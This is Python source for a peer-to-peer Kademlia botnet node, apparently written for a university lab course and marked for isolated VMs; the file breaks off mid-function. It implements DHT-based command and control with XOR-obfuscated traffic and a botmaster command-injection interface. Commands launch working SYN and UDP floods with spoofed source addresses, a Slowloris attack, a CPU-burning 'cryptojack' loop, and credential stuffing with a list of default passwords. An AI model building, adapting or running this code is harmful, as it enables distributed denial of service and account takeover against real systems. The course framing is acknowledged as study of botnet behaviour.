"""
====================================================
 AUA CS 232/337 — Botnet Research Project
 Component: Phase 3 — Kademlia P2P DHT Botnet Node (Python)
 ENHANCED — Fully interoperable with kademlia_p2p.c
 ISOLATED VM LAB ONLY
====================================================

Enhancements over original p2p_node.py:
  ✓ Binary wire format — fully compatible with kademlia_p2p.c (C↔Python mesh)
  ✓ bucket_index aligned with C (d.bit_length() - 1 = position from LSB)
  ✓ Value replication thread (actually replicates on REPLICATE_INTERVAL)
  ✓ Multiple bootstrap seeds via repeated --bootstrap HOST:PORT
  ✓ stop_all / shutdown command types (already present, now also sent on wire)
  ✓ Status thread with richer output
  ✓ 5-node demo with 40% resilience kill test
  ✓ In-process attack helpers with stop-event cancellation
  ✓ Command dedup ring-buffer matching C (256 entries)
  ✓ cred_stuffing command type
  ✓ Graceful SIGINT / KeyboardInterrupt shutdown

Wire format (shared with kademlia_p2p.c):
  HDR [35 bytes]: [1 type][8 msg_id][20 sender_id][4 sender_ip NBO][2 sender_port NBO]
  PING        : HDR
  PONG        : HDR
  FIND_NODE   : HDR + [20 target_id]
  FOUND_NODES : HDR + [1 count] + count × [20 id][4 ip NBO][2 port NBO]
  STORE       : HDR + [20 key][2 val_len NBO][val_len bytes value]
  FIND_VALUE  : HDR + [20 key]
  FOUND_VALUE : HDR + [20 key][2 val_len NBO][val_len bytes value]
  STOP_ALL    : HDR
  SHUTDOWN    : HDR
  Encryption  : XOR with SHA-256("AUA_P2P_MESH_KEY") keystream (same as C)
"""

import os
import sys
import time
import json
import math
import random
import signal
import socket
import struct
import hashlib
import threading
import collections
from datetime import datetime
from typing import Optional, List, Tuple

# ── Constants ──────────────────────────────────────────────────
K                  = 8       # k-bucket size
ALPHA              = 3       # iterative lookup concurrency
ID_BITS            = 160     # node ID length in bits
BUCKET_COUNT       = ID_BITS
CONTACT_SIZE       = 20 + 4 + 2  # node_id + ip (NBO) + port (NBO) = 26 bytes
HDR_SIZE           = 1 + 8 + 20 + 4 + 2  # 35 bytes

PING_TIMEOUT       = 2.0    # seconds
FIND_TIMEOUT       = 3.0    # seconds
REFRESH_INTERVAL   = 300    # seconds
REPLICATE_INTERVAL = 3600   # seconds
STATUS_INTERVAL    = 60     # seconds
POLL_INTERVAL      = 30     # seconds
EXEC_HISTORY       = 256    # command dedup ring-buffer size

# Shared AES/XOR key — identical to C
P2P_SECRET = b"AUA_P2P_MESH_KEY"

# ── Message types — identical to kademlia_p2p.c ───────────────
class MSG:
    PING        = 0x01
    PONG        = 0x02
    FIND_NODE   = 0x03
    FOUND_NODES = 0x04
    STORE       = 0x05
    FIND_VALUE  = 0x06
    FOUND_VALUE = 0x07
    STOP_ALL    = 0x08
    SHUTDOWN    = 0x09

# ── XOR stream cipher ─────────────────────────────────────────
_KEY_HASH = hashlib.sha256(P2P_SECRET).digest()   # pre-computed, 32 bytes

def xor_cipher(data: bytes) -> bytes:
    """XOR with repeating SHA-256(P2P_SECRET) keystream — matches C xor_cipher."""
    out = bytearray(len(data))
    kl = len(_KEY_HASH)
    for i, b in enumerate(data):
        out[i] = b ^ _KEY_HASH[i % kl]
    return bytes(out)


# ── NodeID ────────────────────────────────────────────────────

class NodeID:
    """160-bit node identifier using XOR distance metric."""

    __slots__ = ("value",)

    def __init__(self, value: int):
        assert 0 <= value < (1 << ID_BITS), "NodeID out of range"
        self.value = value

    @classmethod
    def from_bytes(cls, b: bytes) -> "NodeID":
        return cls(int.from_bytes(b[:20], "big"))

    @classmethod
    def from_host_port(cls, host: str, port: int) -> "NodeID":
        """SHA-1(host:port) — matches C id_from_host_port."""
        raw = hashlib.sha1(f"{host}:{port}".encode()).digest()
        return cls.from_bytes(raw)

    @classmethod
    def random(cls) -> "NodeID":
        return cls(random.getrandbits(ID_BITS))

    def to_bytes(self) -> bytes:
        return self.value.to_bytes(20, "big")

    def distance(self, other: "NodeID") -> int:
        return self.value ^ other.value

    def bucket_index(self, other: "NodeID") -> int:
        """
        Returns which k-bucket other belongs to from self's perspective.
        Bucket index = position of highest differing bit (0 = LSB side).
        Matches C: (ID_BYTES-1-byte)*8 + bit  ≡  d.bit_length() - 1
        """
        d = self.distance(other)
        if d == 0:
            return -1
        return d.bit_length() - 1   # 0 = most similar, 159 = most different

    def to_hex(self) -> str:
        return f"{self.value:040x}"

    def __eq__(self, other):
        return isinstance(other, NodeID) and self.value == other.value

    def __hash__(self):
        return hash(self.value)

    def __repr__(self):
        return f"NodeID({self.to_hex()[:12]}...)"


# ── Contact ───────────────────────────────────────────────────

class Contact:
    """A known peer in the Kademlia network."""

    __slots__ = ("node_id", "host", "port", "last_seen", "fail_count")

    def __init__(self, node_id: NodeID, host: str, port: int):
        self.node_id    = node_id
        self.host       = host
        self.port       = port          # host byte order
        self.last_seen  = time.time()
        self.fail_count = 0

    # ── Wire encoding (26 bytes) ───────────────────────────────

    def to_wire(self) -> bytes:
        """[20 id][4 ip NBO][2 port NBO] — matches C CONTACT_SIZE."""
        return (self.node_id.to_bytes() +
                socket.inet_aton(self.host) +
                struct.pack("!H", self.port))

    @classmethod
    def from_wire(cls, data: bytes, offset: int = 0) -> Tuple["Contact", int]:
        """Parse 26 bytes. Returns (Contact, new_offset)."""
        if offset + CONTACT_SIZE > len(data):
            raise ValueError("Truncated contact")
        id_bytes   = data[offset:offset+20]
        ip_bytes   = data[offset+20:offset+24]
        port_bytes = data[offset+24:offset+26]
        node_id = NodeID.from_bytes(id_bytes)
        host    = socket.inet_ntoa(ip_bytes)
        port    = struct.unpack("!H", port_bytes)[0]
        return cls(node_id, host, port), offset + CONTACT_SIZE

    def __eq__(self, other):
        return isinstance(other, Contact) and self.node_id == other.node_id

    def __hash__(self):
        return hash(self.node_id)

    def __repr__(self):
        return f"Contact({self.node_id.to_hex()[:8]}...@{self.host}:{self.port})"


# ── Wire message builder / parser ─────────────────────────────

def build_msg(msg_type: int, self_contact: Contact,
              msg_id: bytes = None, payload: bytes = b"") -> bytes:
    """
    Build an encrypted UDP message.
    HDR: [1 type][8 msg_id][20 sender_id][4 sender_ip NBO][2 sender_port NBO]
    """
    if msg_id is None:
        msg_id = os.urandom(8)
    hdr = (struct.pack("!B", msg_type) +
           msg_id +
           self_contact.node_id.to_bytes() +
           socket.inet_aton(self_contact.host) +
           struct.pack("!H", self_contact.port))
    return xor_cipher(hdr + payload)

def parse_msg(data: bytes) -> Optional[dict]:
    """
    Decrypt and parse an incoming UDP message.
    Returns dict with keys: type, msg_id, sender, payload
    or None on error.
    """
    if len(data) < HDR_SIZE:
        return None
    try:
        dec = xor_cipher(data)
        msg_type = dec[0]
        msg_id   = dec[1:9]
        id_bytes = dec[9:29]
        ip_bytes = dec[29:33]
        pt_bytes = dec[33:35]
        payload  = dec[35:]

        sender_id   = NodeID.from_bytes(id_bytes)
        sender_host = socket.inet_ntoa(ip_bytes)
        sender_port = struct.unpack("!H", pt_bytes)[0]
        sender      = Contact(sender_id, sender_host, sender_port)
        return {
            "type":    msg_type,
            "msg_id":  msg_id,
            "sender":  sender,
            "payload": payload,
        }
    except Exception:
        return None

# ── K-Bucket ──────────────────────────────────────────────────

class KBucket:
    """
    Single k-bucket (LRU-ordered, Sybil-resistant probe-before-evict).
    Thread-safe via internal lock.
    """

    def __init__(self, k: int = K):
        self.k        = k
        self.contacts: collections.OrderedDict = collections.OrderedDict()
        self.lock     = threading.Lock()

    def add(self, contact: Contact, ping_fn=None) -> bool:
        with self.lock:
            key = contact.node_id.value
            if key in self.contacts:
                self.contacts.move_to_end(key)
                self.contacts[key].last_seen  = time.time()
                self.contacts[key].fail_count = 0
                return True
            if len(self.contacts) < self.k:
                self.contacts[key] = contact
                return True
            # Bucket full — probe oldest (Sybil resistance)
            oldest_key     = next(iter(self.contacts))
            oldest_contact = self.contacts[oldest_key]
            alive = ping_fn(oldest_contact) if ping_fn else False
            if alive:
                self.contacts.move_to_end(oldest_key)
                self.contacts[oldest_key].last_seen = time.time()
                return False
            else:
                del self.contacts[oldest_key]
                self.contacts[key] = contact
                return True

    def remove(self, node_id: NodeID):
        with self.lock:
            self.contacts.pop(node_id.value, None)

    def get_all(self) -> List[Contact]:
        with self.lock:
            return list(self.contacts.values())

    def __len__(self):
        with self.lock:
            return len(self.contacts)


# ── Routing Table ─────────────────────────────────────────────

class RoutingTable:
    """Full Kademlia routing table: 160 k-buckets."""

    def __init__(self, self_id: NodeID, k: int = K):
        self.self_id = self_id
        self.k       = k
        self.buckets = [KBucket(k) for _ in range(BUCKET_COUNT)]

    def add(self, contact: Contact, ping_fn=None) -> bool:
        if contact.node_id == self.self_id:
            return False
        idx = self.self_id.bucket_index(contact.node_id)
        if idx < 0 or idx >= BUCKET_COUNT:
            return False
        return self.buckets[idx].add(contact, ping_fn)

    def remove(self, node_id: NodeID):
        idx = self.self_id.bucket_index(node_id)
        if 0 <= idx < BUCKET_COUNT:
            self.buckets[idx].remove(node_id)

    def find_closest(self, target_id: NodeID, n: int = K) -> List[Contact]:
        """Find n closest contacts to target_id (sorted by XOR distance)."""
        candidates = []
        for bucket in self.buckets:
            candidates.extend(bucket.get_all())
        candidates.sort(key=lambda c: c.node_id.distance(target_id))
        return candidates[:n]

    def all_contacts(self) -> List[Contact]:
        result = []
        for bucket in self.buckets:
            result.extend(bucket.get_all())
        return result

    def bucket_stats(self) -> List[int]:
        return [len(b) for b in self.buckets if len(b) > 0]


# ── In-process attack helpers ─────────────────────────────────
# All accept a threading.Event stop argument as the last parameter.

def _attack_syn_flood(target: str, port: int, duration: int,
                       stop: threading.Event):
    try:
        from scapy.all import IP, TCP, send, conf
        conf.verb = 0
    except ImportError:
        print("[P2P] Scapy not installed — pip3 install scapy"); return
    print(f"[ATTACK] SYN FLOOD -> {target}:{port}  duration={duration}s")
    end = time.time() + duration
    count = 0
    while time.time() < end and not stop.is_set():
        src = ".".join(str(random.randint(10, 230)) for _ in range(4))
        pkt = (IP(src=src, dst=target) /
               TCP(sport=random.randint(1024, 65535),
                   dport=port, flags="S",
                   seq=random.randint(0, 2**32 - 1)))
        send(pkt, verbose=False)
        count += 1
    print(f"[ATTACK] SYN FLOOD done. Packets: {count}")


def _attack_udp_flood(target: str, duration: int, stop: threading.Event):
    try:
        from scapy.all import IP, UDP, Raw, send, conf
        conf.verb = 0
    except ImportError:
        print("[P2P] Scapy not installed"); return
    print(f"[ATTACK] UDP FLOOD -> {target}  duration={duration}s")
    payload = b"\x00" * 1024
    end = time.time() + duration
    count = 0
    while time.time() < end and not stop.is_set():
        src = ".".join(str(random.randint(10, 230)) for _ in range(4))
        pkt = (IP(src=src, dst=target) /
               UDP(sport=random.randint(1024, 65535),
                   dport=random.randint(1, 65534)) /
               Raw(load=payload))
        send(pkt, verbose=False)
        count += 1
    print(f"[ATTACK] UDP FLOOD done. Packets: {count}")


def _attack_slowloris(target: str, port: int, duration: int,
                       stop: threading.Event):
    """Inline Slowloris — open 150 sockets, drip headers every 10s."""
    print(f"[ATTACK] SLOWLORIS -> {target}:{port}  duration={duration}s")
    socks = []
    for _ in range(150):
        if stop.is_set(): break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n"
                   f"Host: {target}\r\n".encode())
            socks.append(s)
        except Exception:
            pass
    end = time.time() + duration
    while time.time() < end and not stop.is_set():
        dead = []
        for s in list(socks):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            except Exception:
                dead.append(s)
        for s in dead:
            socks.remove(s)
            try: s.close()
            except Exception: pass
        # Refill dropped connections
        while len(socks) < 150 and not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n"
                       f"Host: {target}\r\n".encode())
                socks.append(s)
            except Exception:
                break
        stop.wait(10)
    for s in socks:
        try: s.close()
        except Exception: pass
    print(f"[ATTACK] SLOWLORIS done.")


def _attack_cryptojack(duration: int, cpu: float, stop: threading.Event):
    """CPU burn loop with duty-cycle throttle."""
    print(f"[ATTACK] CRYPTOJACK  cpu={cpu*100:.0f}%  duration={duration}s")
    state = os.urandom(32)
    end = time.time() + duration
    while time.time() < end and not stop.is_set():
        work_end = time.perf_counter() + cpu * 0.1
        while time.perf_counter() < work_end:
            state = hashlib.sha256(state).digest()
        time.sleep((1.0 - cpu) * 0.1)
    print("[ATTACK] CRYPTOJACK done.")


def _attack_cred_stuffing(target: str, port: int, duration: int,
                            stop: threading.Event):
    """Credential stuffing — POST to /login with known weak pairs."""
    CREDS = [
        ("admin","admin"), ("root","root"), ("admin","password"),
        ("user","user"), ("admin","1234"), ("root","toor"),
        ("admin","admin123"), ("guest","guest"), ("test","test"),
        ("support","support"), ("admin","pass"), ("root","pass"),
        ("admin","12345"), ("root","12345"), ("user","password"),
        ("pi","raspberry"), ("admin",""), ("root",""),
        ("admin","admin1"), ("operator","operator"),
        ("admin","system"), ("root","system"),
        ("ubnt","ubnt"), ("admin","ubnt"),
        ("supervisor","supervisor"), ("user","1234"),
        ("admin","changeme"), ("root","123456"), ("admin","123456"),
        ("tech","tech"),
    ]
    url = f"http://{target}:{port}/login"
    print(f"[ATTACK] CRED STUFFING -> {url}  pairs={len(CREDS)}")
    try:
        import requests
    except ImportError:
        print("[ATTACK] requests not installed — pip3 install requests"); return

    end = time.time() + duration
    hits = 0
    while time.time() < end and not stop.is_set():
        for user, pwd in CREDS:
            if stop.is_set() or time.time() > end: break
            try:
                r = requests.post(url,
                                  data={"username": user, "password": pwd},
                                  timeout=3)
                if r.status_code == 200:
                    print(f"[ATTACK] CRED HIT: {user}:{pwd}")
                    hits += 1
            except Exception:
                pass
            stop.wait(random.uniform(0.3, 0.8))
    print(f"[ATTACK] CRED STUFFING done. Hits: {hits}")


# ── Kademlia Node ─────────────────────────────────────────────

class KademliaNode:
    """
    Full Kademlia DHT node — Phase 3 P2P botnet mesh.
    Binary wire format compatible with kademlia_p2p.c.
    """

    COMMAND_KEY = hashlib.sha1(b"botnet_command_v1").hexdigest()

    def __init__(self, host: str, port: int,
                 bootstrap_peers: List[Tuple[str, int]] = None):
        self.host    = host
        self.port    = port
        self.node_id = NodeID.from_host_port(host, port)
        self.contact = Contact(self.node_id, host, port)
        self.routing = RoutingTable(self.node_id)

        self.store      : dict = {}   # key -> {"value": str, "ts": float}
        self.store_lock = threading.Lock()

        self._sock    = None
        self._running = False

        # Pending RPCs: msg_id (bytes) -> threading.Event
        self._pending   : dict = {}
        self._responses : dict = {}
        self._rpc_lock  = threading.Lock()

        self.bootstrap_peers = bootstrap_peers or []

        # Command dedup — ring buffer matching C
        self._exec_ring  = [None] * EXEC_HISTORY  # stores SHA-1 hex strings
        self._exec_count = 0
        self._exec_lock  = threading.Lock()

        # Active attacks: cmd_type -> (thread, stop_event)
        self._active      : dict = {}
        self._active_lock = threading.Lock()

        print(f"[P2P] Node ID: {self.node_id.to_hex()[:16]}...")
        print(f"[P2P] Listening on {host}:{port}")

    # ── Transport ──────────────────────────────────────────────

    def _bind(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1.0)
        self._sock.bind((self.host, self.port))

    def _send_raw(self, data: bytes, host: str, port: int):
        try:
            self._sock.sendto(data, (host, port))
        except Exception:
            pass

    def _send_rpc(self, msg_type: int, host: str, port: int,
                  timeout: float = FIND_TIMEOUT,
                  payload: bytes = b"") -> Optional[dict]:
        """Send an RPC message and wait for a response (matched by msg_id)."""
        msg_id = os.urandom(8)
        evt    = threading.Event()
        with self._rpc_lock:
            self._pending[msg_id] = evt
        data = build_msg(msg_type, self.contact, msg_id=msg_id, payload=payload)
        self._send_raw(data, host, port)
        evt.wait(timeout)
        with self._rpc_lock:
            self._pending.pop(msg_id, None)
            resp = self._responses.pop(msg_id, None)
        return resp

    # ── Receive loop ───────────────────────────────────────────

    def _recv_loop(self):
        while self._running:
            try:
                data, _addr = self._sock.recvfrom(65535)
            except socket.timeout:
                continue
            except Exception:
                break

            msg = parse_msg(data)
            if not msg:
                continue

            # Add sender to routing table (every message received does this)
            try:
                self.routing.add(msg["sender"], ping_fn=self._ping_contact)
            except Exception:
                pass

            msg_id = msg["msg_id"]
            with self._rpc_lock:
                if msg_id in self._pending:
                    self._responses[msg_id] = msg
                    self._pending[msg_id].set()
                    continue

            # Not a response — handle as incoming request
            self._handle_incoming(msg)

    # ── Incoming RPC handler ───────────────────────────────────

    def _handle_incoming(self, msg: dict):
        msg_type = msg["type"]
        sender   = msg["sender"]
        msg_id   = msg["msg_id"]
        payload  = msg["payload"]

        if msg_type == MSG.PING:
            resp = build_msg(MSG.PONG, self.contact, msg_id=msg_id)
            self._send_raw(resp, sender.host, sender.port)

        elif msg_type == MSG.FIND_NODE and len(payload) >= 20:
            target_id = NodeID.from_bytes(payload[:20])
            closest   = self.routing.find_closest(target_id, K)
            wire      = b"".join(c.to_wire() for c in closest)
            pl        = struct.pack("!B", len(closest)) + wire
            resp      = build_msg(MSG.FOUND_NODES, self.contact,
                                  msg_id=msg_id, payload=pl)
            self._send_raw(resp, sender.host, sender.port)

        elif msg_type == MSG.STORE and len(payload) >= 22:
            key      = payload[:20]
            vlen     = struct.unpack("!H", payload[20:22])[0]
            value    = payload[22:22+vlen].decode("utf-8", errors="replace")
            key_hex  = key.hex()
            with self.store_lock:
                self.store[key_hex] = {"value": value, "ts": time.time()}
            resp = build_msg(MSG.PONG, self.contact, msg_id=msg_id)
            self._send_raw(resp, sender.host, sender.port)

        elif msg_type == MSG.FIND_VALUE and len(payload) >= 20:
            key     = payload[:20]
            key_hex = key.hex()
            with self.store_lock:
                entry = self.store.get(key_hex)
            if entry:
                val_bytes = entry["value"].encode("utf-8")
                vlen_b    = struct.pack("!H", len(val_bytes))
                pl        = key + vlen_b + val_bytes
                resp      = build_msg(MSG.FOUND_VALUE, self.contact,
                                      msg_id=msg_id, payload=pl)
            else:
                target_id = NodeID.from_bytes(key)
                closest   = self.routing.find_closest(target_id, K)
                wire      = b"".join(c.to_wire() for c in closest)
                pl        = struct.pack("!B", len(closest)) + wire
                resp      = build_msg(MSG.FOUND_NODES, self.contact,
                                      msg_id=msg_id, payload=pl)
            self._send_raw(resp, sender.host, sender.port)

        elif msg_type == MSG.STOP_ALL:
            print("[P2P] STOP_ALL received")
            self._stop_all_attacks()

        elif msg_type == MSG.SHUTDOWN:
            print("[P2P] SHUTDOWN received")
            self._stop_all_attacks()
            self._running = False

    # ── Kademlia RPC wrappers ──────────────────────────────────

    def _ping_contact(self, contact: Contact) -> bool:
        resp = self._send_rpc(MSG.PING, contact.host, contact.port,
                               timeout=PING_TIMEOUT)
        return resp is not None and resp["type"] == MSG.PONG

    def _find_node_rpc(self, contact: Contact,
                        target_id: NodeID) -> List[Contact]:
        pl   = target_id.to_bytes()
        resp = self._send_rpc(MSG.FIND_NODE, contact.host, contact.port,
                               payload=pl)
        if not resp or resp["type"] != MSG.FOUND_NODES:
            return []
        payload = resp["payload"]
        if not payload:
            return []
        count   = payload[0]
        result  = []
        offset  = 1
        for _ in range(count):
            try:
                c, offset = Contact.from_wire(payload, offset)
                result.append(c)
            except Exception:
                break
        return result

    def _find_value_rpc(self, contact: Contact,
                         key: str) -> Tuple[Optional[str], List[Contact]]:
        key_bytes = bytes.fromhex(key)
        pl        = key_bytes
        resp      = self._send_rpc(MSG.FIND_VALUE, contact.host, contact.port,
                                    payload=pl)
        if not resp:
            return None, []
        if resp["type"] == MSG.FOUND_VALUE:
            payload = resp["payload"]
            if len(payload) >= 22:
                vlen  = struct.unpack("!H", payload[20:22])[0]
                value = payload[22:22+vlen].decode("utf-8", errors="replace")
                return value, []
            return None, []
        if resp["type"] == MSG.FOUND_NODES:
            payload  = resp["payload"]
            if not payload:
                return None, []
            count  = payload[0]
            closer = []
            offset = 1
            for _ in range(count):
                try:
                    c, offset = Contact.from_wire(payload, offset)
                    closer.append(c)
                except Exception:
                    break
            return None, closer
        return None, []

    def _store_rpc(self, contact: Contact, key: str, value: str) -> bool:
        key_bytes = bytes.fromhex(key)
        val_bytes = value.encode("utf-8")
        pl        = key_bytes + struct.pack("!H", len(val_bytes)) + val_bytes
        resp      = self._send_rpc(MSG.STORE, contact.host, contact.port,
                                    payload=pl)
        return resp is not None

    # ── Iterative lookups ──────────────────────────────────────

    def iterative_find_node(self, target_id: NodeID) -> List[Contact]:
        """Parallel ALPHA iterative FIND_NODE."""
        closest = self.routing.find_closest(target_id, K)
        if not closest:
            return []
        closest.sort(key=lambda c: c.node_id.distance(target_id))
        queried: set = set()

        for _ in range(20):
            to_query = [c for c in closest
                        if c.node_id.value not in queried][:ALPHA]
            if not to_query:
                break

            new_contacts: List[Contact] = []
            lock = threading.Lock()

            def _query(c: Contact):
                queried.add(c.node_id.value)
                returned = self._find_node_rpc(c, target_id)
                with lock:
                    new_contacts.extend(returned)
                for nc in returned:
                    self.routing.add(nc, ping_fn=self._ping_contact)

            threads = [threading.Thread(target=_query, args=(c,),
                                        daemon=True) for c in to_query]
            for t in threads: t.start()
            for t in threads: t.join(timeout=FIND_TIMEOUT + 1)

            if not new_contacts:
                break
            for nc in new_contacts:
                if nc.node_id != self.node_id and nc not in closest:
                    closest.append(nc)
            closest.sort(key=lambda c: c.node_id.distance(target_id))
            closest = closest[:K]

        return closest

    def iterative_find_value(self, key: str) -> Optional[str]:
        """Parallel ALPHA iterative FIND_VALUE. Returns value string or None."""
        target_id = NodeID(int(hashlib.sha1(key.encode()).hexdigest(), 16))
        closest   = self.routing.find_closest(target_id, K)
        if not closest:
            return None
        closest.sort(key=lambda c: c.node_id.distance(target_id))
        queried: set = set()

        for _ in range(20):
            to_query = [c for c in closest
                        if c.node_id.value not in queried][:ALPHA]
            if not to_query:
                break

            found_value = [None]
            new_contacts: List[Contact] = []
            lock = threading.Lock()
            found_event = threading.Event()

            def _query(c: Contact):
                queried.add(c.node_id.value)
                val, closer = self._find_value_rpc(c, key)
                with lock:
                    if val is not None and found_value[0] is None:
                        found_value[0] = val
                        found_event.set()
                    new_contacts.extend(closer)
                for nc in closer:
                    self.routing.add(nc, ping_fn=self._ping_contact)

            threads = [threading.Thread(target=_query, args=(c,),
                                        daemon=True) for c in to_query]
            for t in threads: t.start()
            for t in threads: t.join(timeout=FIND_TIMEOUT + 1)

            if found_value[0] is not None:
                return found_value[0]
            if not new_contacts:
                break
            for nc in new_contacts:
                if nc not in closest:
                    closest.append(nc)
            closest.sort(key=lambda c: c.node_id.distance(target_id))
            closest = closest[:K]

        return None

    def store_value(self, key: str, value: str) -> int:
        """Store key→value on the K closest nodes in the DHT. Returns ack count."""
        key_bytes = bytes.fromhex(key)
        target_id = NodeID(int(hashlib.sha1(key.encode()).hexdigest(), 16))
        with self.store_lock:
            self.store[key] = {"value": value, "ts": time.time()}
        closest = self.iterative_find_node(target_id)
        acks = 0
        for contact in closest[:K]:
            if self._store_rpc(contact, key, value):
                acks += 1
        return acks

    # ── Bootstrap ──────────────────────────────────────────────

    def bootstrap(self):
        """Join the P2P mesh by pinging seed nodes, then FIND_NODE on own ID."""
        print(f"[P2P] Bootstrapping from {len(self.bootstrap_peers)} seed(s)...")
        for host, port in self.bootstrap_peers:
            seed_id = NodeID.from_host_port(host, port)
            seed    = Contact(seed_id, host, port)
            if self._ping_contact(seed):
                self.routing.add(seed)
                print(f"[P2P] Seed reachable: {host}:{port}")
            else:
                print(f"[P2P] Seed unreachable: {host}:{port}")
        self.iterative_find_node(self.node_id)
        total = len(self.routing.all_contacts())
        print(f"[P2P] Routing table populated: {total} peers")

    # ── Command handling ───────────────────────────────────────

    def _dedup_seen(self, value: str) -> bool:
        """Ring-buffer dedup — matches C exec_hashes ring."""
        h = hashlib.sha1(value.encode()).hexdigest()
        with self._exec_lock:
            # Check recent EXEC_HISTORY entries
            count = min(self._exec_count, EXEC_HISTORY)
            for i in range(count):
                slot = (self._exec_count - 1 - i) % EXEC_HISTORY
                if self._exec_ring[slot] == h:
                    return True
            self._exec_ring[self._exec_count % EXEC_HISTORY] = h
            self._exec_count += 1
            return False

    def _poll_for_commands(self):
        value = self.iterative_find_value(self.COMMAND_KEY)
        if not value:
            return
        if self._dedup_seen(value):
            return
        try:
            cmd = json.loads(value)
        except Exception:
            return
        print(f"\n[P2P] *** COMMAND RECEIVED from DHT ***")
        print(f"[P2P] Type: {cmd.get('type')}  Payload: {value[:120]}")
        self._execute_command(cmd)

    def inject_command(self, cmd: dict) -> int:
        """Botmaster interface: store a command in the DHT."""
        value = json.dumps(cmd)
        acks  = self.store_value(self.COMMAND_KEY, value)
        print(f"[P2P] Command injected: {cmd.get('type')} → stored on {acks} nodes")
        return acks

    # ── Attack management ──────────────────────────────────────

    def _launch(self, cmd_type: str, fn, *args):
        """Run attack fn in daemon thread; cancel any prior instance."""
        with self._active_lock:
            if cmd_type in self._active:
                _, old_stop = self._active.pop(cmd_type)
                old_stop.set()
            stop = threading.Event()
            t    = threading.Thread(target=fn, args=(*args, stop),
                                    daemon=True, name=f"p2p-{cmd_type}")
            t.start()
            self._active[cmd_type] = (t, stop)
        print(f"[ATTACK] Launched: {cmd_type}")

    def _stop_all_attacks(self):
        with self._active_lock:
            for _, (_, ev) in self._active.items():
                ev.set()
            self._active.clear()
        print("[ATTACK] All attacks stopped.")

    def _execute_command(self, cmd: dict):
        cmd_type = cmd.get("type", "idle")

        if cmd_type == "syn_flood":
            self._launch("syn_flood", _attack_syn_flood,
                         cmd.get("target", "192.168.100.20"),
                         int(cmd.get("port", 80)),
                         int(cmd.get("duration", 30)))

        elif cmd_type == "udp_flood":
            self._launch("udp_flood", _attack_udp_flood,
                         cmd.get("target", "192.168.100.20"),
                         int(cmd.get("duration", 30)))

        elif cmd_type == "slowloris":
            self._launch("slowloris", _attack_slowloris,
                         cmd.get("target", "192.168.100.20"),
                         int(cmd.get("port", 80)),
                         int(cmd.get("duration", 60)))

        elif cmd_type == "cryptojack":
            self._launch("cryptojack", _attack_cryptojack,
                         int(cmd.get("duration", 120)),
                         float(cmd.get("cpu", 0.25)))

        elif cmd_type == "cred_stuffing":
            self._launch("cred_stuffing", _attack_cred_stuffing,
                         cmd.get("target", "192.168.100.20"),
                         int(cmd.get("port", 80)),
                         int(cmd.get("duration", 120)))

        elif cmd_type == "stop_all":
            self._stop_all_attacks()

        elif cmd_type == "shutdown":
            self._stop_all_attacks()
            self._running = False

        elif cmd_type == "idle":
            print("[P2P] -> Idle")

        else:
            print(f"[P2P] -> Unknown command type: {cmd_type}")

    # ── Maintenance threads ────────────────────────────────────

    def _refresh_loop(self):
        while self._running:
            time.sleep(REFRESH_INTERVAL)
            if not self._running: break
            print("[P2P] Refreshing routing table...")
            for i, bucket in enumerate(self.routing.buckets):
                if len(bucket) == 0: continue
                rnd_id = NodeID.random()
                self.iterative_find_node(rnd_id)
            total = len(self.routing.all_contacts())
            print(f"[P2P] Refresh done. {total} peers in routing table.")

    def _command_poll_loop(self):
        while self._running:
            jitter = random.randint(-5, 5)
            time.sleep(POLL_INTERVAL + jitter)
            if self._running:
                self._poll_for_commands()

    def _replicate_loop(self):
        """Periodically re-store locally held values on K closest nodes."""
        while self._running:
            time.sleep(REPLICATE_INTERVAL)
            if not self._running: break
            print("[P2P] Replicating locally stored values...")
            with self.store_lock:
                snapshot = dict(self.store)
            for key, entry in snapshot.items():
                try:
                    target_id = NodeID(int(hashlib.sha1(key.encode()).hexdigest(), 16))
                    closest   = self.iterative_find_node(target_id)
                    acks = sum(1 for c in closest[:K]
                               if self._store_rpc(c, key, entry["value"]))
                    print(f"[P2P] Replicated key {key[:12]}... on {acks} nodes")
                except Exception:
                    pass

    def _status_loop(self):
        while self._running:
            time.sleep(STATUS_INTERVAL)
            if not self._running: break
            contacts = self.routing.all_contacts()
            with self.store_lock:
                n_keys = len(self.store)
            with self._active_lock:
                active_attacks = list(self._active.keys())
            print(f"\n[P2P] ── Status @ {datetime.now().strftime('%H:%M:%S')} ──")
            print(f"[P2P]  Node ID : {self.node_id.to_hex()[:16]}...")
            print(f"[P2P]  Peers   : {len(contacts)}")
            print(f"[P2P]  KV keys : {n_keys}")
            print(f"[P2P]  Attacks : {active_attacks or 'none'}")
            print(f"[P2P]  Cmds    : {self._exec_count} executed")
            if contacts:
                for c in contacts[:3]:
                    print(f"[P2P]    {c.node_id.to_hex()[:12]}... @ {c.host}:{c.port}")
            print()

    # ── Start / stop ───────────────────────────────────────────

    def start(self) -> list:
        self._bind()
        self._running = True
        threads = [
            threading.Thread(target=self._recv_loop,         daemon=True, name="recv"),
            threading.Thread(target=self._refresh_loop,      daemon=True, name="refresh"),
            threading.Thread(target=self._command_poll_loop, daemon=True, name="cmd_poll"),
            threading.Thread(target=self._replicate_loop,    daemon=True, name="replicate"),
            threading.Thread(target=self._status_loop,       daemon=True, name="status"),
        ]
        for t in threads: t.start()
        self.bootstrap()
        return threads

    def stop(self):
        self._running = False
        self._stop_all_attacks()
        if self._sock:
            try: self._sock.close()
            except Exception: pass

    def status(self) -> dict:
        contacts = self.routing.all_contacts()
        with self._active_lock:
            active_attacks = list(self._active.keys())
        with self.store_lock:
            store_keys = list(self.store.keys())
        return {
            "node_id":        self.node_id.to_hex(),
            "host":           self.host,
            "port":           self.port,
            "peer_count":     len(contacts),
            "store_keys":     store_keys,
            "bucket_fill":    self.routing.bucket_stats(),
            "active_attacks": active_attacks,
            "cmds_executed":  self._exec_count,
        }


# ── Resilience demonstration ───────────────────────────────────

def demonstrate_resilience(nodes: List[KademliaNode],
                            kill_fraction: float = 0.4):
    """
